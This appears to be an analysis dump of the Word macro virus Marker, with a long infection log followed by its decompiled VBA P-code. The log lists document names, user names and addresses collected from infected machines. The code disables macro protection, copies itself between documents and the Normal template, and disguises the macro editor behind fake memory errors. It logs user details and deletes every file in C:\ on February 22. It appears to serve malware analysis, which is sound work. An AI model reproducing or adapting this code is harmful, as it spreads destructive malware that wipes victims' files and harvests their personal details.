' 2000TW-BM001.doc

' 匡도2.doc

' 覩죕와빵0.doc

' 覩죕와빵1.doc

' yp0004.doc

' 99적樓.doc

' 2000YPWT-004.doc

' F1233.doc

' ZDCH004.doc

' 놔뀌괩00.doc

' 嗜든넥覩꼼죕와빵츰데(�諧邂㏈�).doc

' 匡도1

' 2000TW-BM039.doc

' 2000TW-BM003.doc

' 2000TW-BM004.doc

' 2000TW-BM005.doc

' 2000TW-BM007.doc

' 2000TW-BM008.doc

' 2000TW-BM009.doc

' 2000TW-BM010.doc

' 2000TW-BM011.doc

' 2000TW-BM012.doc

' 2000TW-BM013.doc

' 2000TW-BM014.doc

' 2000TW-BM015.doc

' 2000TW-BM016.doc

' 2000TW-BM017.doc

' 2000TW-BM018.doc

' 2000TW-BM019.doc

' F1233.doc

' 2000TW-BM020.doc

' 匡도1

' 2000TW-BM021.doc

' 2000TW-BM020.doc

' 2000TW-BM022.doc

' 2000TW-BM023.doc

' 2000TW-BM024.doc

' 2000TW-BM025.doc

' 2000TW-BM026.doc

' 2000TW-BM027.doc

' 2000TW-BM028.doc

' 2000TW-BM031.doc

' 2000TW-BM032.doc

' 2000TW-BM035.doc

' 2000TW-BM036.doc

' 2000TW-BM037.doc

' 2000YPWT-001.doc

' 2000YPWT-002.doc

' qxzd0709-1.doc

' 壇   틘.doc

' F1233.doc

' 눈廬목駕2.doc

' 98'푠擧嗜든넥契撚50퓻탤츰.doc

' 琅뵀멩列（꿇틤）莖냥든켬.doc

' 壇   틘.doc

' 璂송-땜꼬-빤켓베적zhuzhou.doc

' qxzd0710-2.doc

' F1233(1).doc

' E20000517.doc

' RESUME(TaiweiBJ2t).doc

' jianlicstarwq(TaiweiBJ2t).doc

' 몸훙숌썽.doc

' 嗜든넥覩꼼죕淃커롸驕괩멩1.doc

' qxzd0711-1.doc

' qxzd0711-2.doc

' LG 든넥쵱룐痰瀾북셉.doc

' yp0001.doc

' qxzd0711-2.doc

' qxzd0711-1.doc

' qxzd0712-1.doc

' 숌저ZHR.doc

' qxzd0000.doc

' 饋簡롤痰.doc

' 눈廬庫（크浪）.doc

' qxzd0713.doc

' 눈廬庫（크浪）1.doc

' 98묩죕츠玖.doc

' 헹斂변(1).DOC

' ZHANGYI(1).doc

' 壇   틘(1).doc

' henry.doc

' job1.doc

' 벴있莖냥굶셕炬.doc

' 벴있莖냥굶셕炬.doc

' 莖북谿섈주001.doc

' 벴있莖마운饋簡헙워.doc

' 벴있莖5%芎푯.doc

' 벴있莖냥굶셕炬깊.doc

' 匡도1

' 놔뀌셕뺍3.doc

' 匡도1

' ADD.doc

' 무鱇숌썽.doc

' JXC.DOC

' 菱수깊.doc

' 菱수깊1.doc

' 눈廬庫（크浪）1.doc

' 琅운멩列(格契).doc

' 놔뀌괩멩04.doc

' 놔뀌괩멩03.doc

' 匡도1

' 匡도2

' 2000벴있槿섈좼饋簡寧응깊01.doc

' 匡도1

' 벴있莖롸토렘갭01.doc

' 벴있莖饋簡마운헙워.doc

' 꼿蛟슥쌈.doc

' 와빵츰쩌.doc

' 99njing놔뀌괩멩.doc

' XHW04.doc

' 벴있槿돨먁剋斤.doc

' JLI헙워-1.doc

' 붚질.doc

' XFZH98구戈쩌.doc

' 벴있槿98쾨뒀갛탤（ FAX�均ㅒ샬�.doc

' 2000묏鱗셕뺍.doc

' 2000쾨놔뀌괩멩01.doc

' 2000쾨놔뀌셕뺍.doc

' 놔뀌셕뺍03.doc

' 놔뀌셕뺍.doc

' 匡도2.doc

' 놔뀌괩멩01.doc

' 묏鱗鋼쨌.doc

' palm廊�溝穎逃㉫�.doc

' 벴있莖茄駱葵累01.doc

' 벴있莖茄駱葵累02.doc

' 섈주桿駱.doc

' 덮땜뒈혐벴있莖饋簡듐섟彊逕헙워.doc

' 밤멩갛탤-2000좼퀼1.doc

' 밤멩갛탤.doc

' 2000쾨밤멩갛탤헙워.doc

' 2000벴있槿붚질쉭饋簡寧응깊01.doc

' 벴있莖롸토렘갭.doc

' ~WRD0002.tmp

' 匡도1

' cute.doc

' PRICE.DOC

' 匡도2

' 2000쾨繫祇쩌.doc

' 묏鱗슥쌈섟悧써.doc

' 揭郭�俓�.doc

' 匡도1

' 珙엌尿묏鱗.doc

' 몸훙숌저.doc

' 12:00:34 오후 -Friday,1 Sep,2000
' Hanjung4
'
' 이력서.doc

' 0822.doc

' 0901.doc

'  人  .doc

' 벴벌路묏撚瓏駕삔�煐識�.doc

' 벴벌路묏撚瓏駕삔�煐識�.doc

' 8월보고서.doc

' 0904.doc

' 현금수표01.doc

' 0831.doc

' 문서1

' 차량구입.doc

' 0905.doc

' 0906.doc

' 08:39:13 오후 -Thursday,7 Sep,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' 0906.doc

' 근태보고서.doc

' 하노이지점 본사보고 (2).doc

' 일일보고2 (2).doc

' facsimile(영문).doc

' 당지점 업무분장.doc

' 경쟁사정보입수관련.doc

' 사인사용신청서.doc

' 첨부--우리사주-청약-안내.doc

' 일일보고2 (4).doc

' 00년추석연휴복지시설운영계획.doc

' 일일 본사보고 (9).doc

' 일일 본사보고 (10).doc

' 일일 본사보고 (11).doc

' Daily Report (9).doc

' Daily Report (9).doc

' 0915.doc

' 0917.doc

' 일일보고2 (7).doc

' 우리사주청약-긴급파악.doc

' 0918 (1).doc

' 332-134.doc

' 332-131.doc

' 0920 (1).doc

' (긴급)우리사주주식배정현황.doc

' 필기2.doc

' 0921 (1).doc

' 필기2.doc

' 우리사주-개인별-최종배정현황.doc

' Daily Report (17).doc

' 0922 (1).doc

' 해외급여주소.doc

' 일일 본사보고 (12).doc

' 0925 (1).doc

' 일일보고2 (9).doc

' 내연발전PM-부고(진철규과장-부친).doc

' 부고(원자력QC-정동부반장).doc

' 체육대회관련-근태.doc

' DAILY REPORT (21).doc

' 일일보고2 (12).doc

' 1005 (1).doc

' p.t hanjung.doc

' 일일 본사보고.doc

' 04:32:55 오후 -Friday,6 Oct,2000
' 한중
'
' 일일 본사보고.doc

' FAX(영문).doc

' 강인섭의원-한중DCM골프회원권(경영관리부1009).doc

' Calculation of Tentative Price2.doc

' 별첨 1,3 Calculation of Tentative Price2.doc

' Final Draft_ HFControls 업무진행상황보고.doc

' 세금계산서입금표청구서.doc

' 대외공문(국문.워드).doc

' 대외공문2(국문.워드).doc

' 이인기의원-출자회사복비및 인건비(1012).doc

' 관계회사 결손금 발생 사유 및 대책(투자설명회0918).doc

' 2000국회예상질의답변서.doc

' 06:00:47 오후 -Wednesday,18 Oct,2000
' 김정오
'
' 경영관리부6.doc

' 경영관리부5.doc

' 경영관리부4.doc

' 경영관리부3.doc

' 최근투자부진(김방림-연구지원부).doc

' 경영관리부2.doc

' 경영관리부1.doc

' HSD 신주발행(국회).doc

' 현대 임대장비(국회).doc

' 진행중인 쟁송사안(국회).doc

' 삼성 경업금지(국회).doc

' 대우 어음금(국회).doc

' 맹형규(공공부문구조조정)실태.doc

' 나머지 SCHEDULE.doc

' 배기운의원국감-내연발전.doc

' 001017-국정감사예상 질의 답변(기술관리부).doc

' 03:49:05 오후 -Wednesday,18 Oct,2000
' 이창훈
'
' 001017-국정감사예상 질의 답변(기술관리부).doc

' 001017-국정감사예상 질의 답변.doc

' 회의소집통보서.doc

' 기술관리부.doc

' 10:01:36 오전 -Thursday,19 Oct,2000
' HANJUNG
'
' load_file.asp?id=2077&no=1

' 보강beam.doc

' 02:02:30 오후 -Monday,23 Oct,2000
' HANJUNG
'
' 보강beam.doc

' load_file.asp?id=2109&no=1

' 전산업무요청서.doc

' 08:53:26 오전 -Monday,30 Oct,2000
' HANJUNG
'
' 전산업무요청서.doc

' load_file.asp?id=2145&no=1

' DrumRod.doc

' equivalent_tube.doc

' 11:36:57 오전 -Tuesday,31 Oct,2000
' HANJUNG
'
' equivalent_tube.doc

' hsintao(OMRF).doc

' 03:37:29 오후 -Monday,6 Nov,2000
' HANJUNG
'
' hsintao.doc

' PRINTING.doc

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.x
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 69176 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #45:
' 	FuncDefn (Private Sub Document_Close())
' Line #46:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #49:
' 	Dim (Const) 
' 	LitStr 0x000A "Yugoslavia"
' 	VarDefn from
' 	QuoteRem 0x001A 0x0032 "nuthin' to do with the GeNiUs just needed a marker"
' Line #50:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #51:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #52:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #53:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #54:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #55:
' 	Dim 
' 	VarDefn rep
' 	VarDefn x (As Integer)
' Line #56:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #57:
' 	Dim 
' 	VarDefn virusCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #58:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #59:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #60:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #61:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #62:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #63:
' 	Ld from 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #64:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #65:
' 	Ld from 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #66:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #68:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #69:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #70:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #71:
' 	Label Delivery 
' Line #72:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #73:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #74:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #75:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' Line #76:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #77:
' 	LitStr 0x000C "That's Right"
' 	Ld vbOK 
' 	Ld vbCritical 
' 	Add 
' 	LitStr 0x000B "It's Murder"
' 	ArgsLd MsgBox 0x0003 
' 	St rep 
' Line #78:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #79:
' 	GoTo Delivery 
' Line #80:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #83:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #84:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #85:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #86:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #87:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #88:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #89:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St virusCode 
' Line #90:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #92:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #93:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #94:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #95:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #96:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #97:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #98:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #101:
' 	ElseBlock 
' Line #102:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #103:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #104:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #109:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000F "hh:mm:ss AMPM -"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x000F "dddd,d mmm,yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St LogData 
' Line #110:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #111:
' 	Ld virusCode 
' 	Ld LogData 
' 	Concat 
' 	St virusCode 
' Line #112:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #113:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #114:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #115:
' 	Ld virusCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #116:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #117:
' 	StartWithExpr 
' 	Ld nt 
' 	MemLd codemodule 
' 	With 
' Line #118:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #119:
' 	LitDI2 0x00AE 
' 	LitStr 0x0010 "Sub viewVBcode()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "x=Msgbox("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B " Error - Not enough memory!"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 ", VbOkonly + VbApplication+Vbcritical,"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Visual Basic Editor"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0009 "x=Msgbox("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001B " Error - Not enough memory!"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 ", VbOkonly + VbApplication+Vbcritical,"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Visual Basic Editor"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #120:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #121:
' 	EndWith 
' Line #122:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #123:
' 	StartWithExpr 
' 	Ld nt 
' 	MemLd codemodule 
' 	With 
' Line #124:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #125:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x002D 
' 	LitDI2 0x00B5 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #126:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #127:
' 	Ld x 
' 	LitStr 0x0002 "' "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #128:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #129:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #131:
' 	EndWith 
' Line #132:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #133:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #134:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #137:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #138:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #139:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #140:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #141:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St virusCode 
' Line #142:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #143:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #144:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #145:
' 	Ld virusCode 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #146:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #147:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #148:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #149:
' 	Ld virusCode 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #150:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #151:
' 	LitDI2 0x00AE 
' 	LitDI2 0x000D 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall Deletelines 0x0002 
' Line #152:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #153:
' 	StartWithExpr 
' 	Ld ad 
' 	MemLd codemodule 
' 	With 
' Line #154:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #155:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x002D 
' 	LitDI2 0x00B5 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #156:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #157:
' 	Ld x 
' 	LitStr 0x0002 "' "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #158:
' 	QuoteRem 0x0000 0x0041 " HANJUNG PRINTING.doc2000.11.06 오후 3:39:58\\SV085\pg082 - NE02:"
' Line #159:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #160:
